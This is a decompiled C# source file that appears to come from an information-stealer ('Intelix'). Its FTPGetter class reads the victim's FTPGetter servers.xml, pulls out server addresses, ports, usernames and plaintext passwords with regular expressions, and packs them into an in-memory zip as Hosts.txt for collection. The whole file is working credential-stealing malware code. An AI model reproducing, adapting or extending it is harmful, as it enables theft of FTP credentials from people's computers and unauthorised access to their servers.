using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000043 RID: 67
	public class FTPGetter : ITarget
	{
		// Token: 0x060000E1 RID: 225 RVA: 0x0000D0AC File Offset: 0x0000B2AC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\FTPGetter\\servers.xml";
			bool flag = !File.Exists(text);
			if (!flag)
			{
				string input = File.ReadAllText(text, Encoding.UTF8);
				Regex regex = new Regex("<server\\b[^>]*>(.*?)</server>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
				Regex regex2 = new Regex("<server_ip>\\s*(?<v>.*?)\\s*</server_ip>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
				Regex regex3 = new Regex("<server_port>\\s*(?<v>\\d+)\\s*</server_port>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
				Regex regex4 = new Regex("<server_user_name>\\s*(?<v>.*?)\\s*</server_user_name>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
				Regex regex5 = new Regex("<server_user_password>\\s*(?<v>.*?)\\s*</server_user_password>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
				List<string> list = new List<string>();
				Counter.CounterApplications counterApplications = new Counter.CounterApplications
				{
					Name = "FTPGetter"
				};
				foreach (object obj in regex.Matches(input))
				{
					Match match = (Match)obj;
					string value = match.Groups[1].Value;
					Match match2 = regex2.Match(value);
					bool success = match2.Success;
					if (success)
					{
						string text2 = match2.Groups["v"].Value.Trim();
						Match match3 = regex3.Match(value);
						string text3 = match3.Success ? match3.Groups["v"].Value.Trim() : "21";
						Match match4 = regex4.Match(value);
						string text4 = match4.Success ? match4.Groups["v"].Value.Trim() : "";
						Match match5 = regex5.Match(value);
						string text5 = match5.Success ? match5.Groups["v"].Value.Trim() : "";
						list.Add(string.Concat(new string[]
						{
							"Url: ",
							text2,
							":",
							string.IsNullOrEmpty(text3) ? "21" : text3,
							"\nUsername: ",
							text4,
							"\nPassword: ",
							text5,
							"\n"
						}));
						counterApplications.Files.Add(text + " => FTPGetter\\Hosts.txt");
					}
				}
				bool flag2 = list.Count > 0;
				if (flag2)
				{
					zip.AddFile("FTPGetter\\Hosts.txt", Encoding.UTF8.GetBytes(string.Join("\n", list)));
					counterApplications.Files.Add("FTPGetter\\Hosts.txt");
					counter.Applications.Add(counterApplications);
				}
			}
		}
	}
}
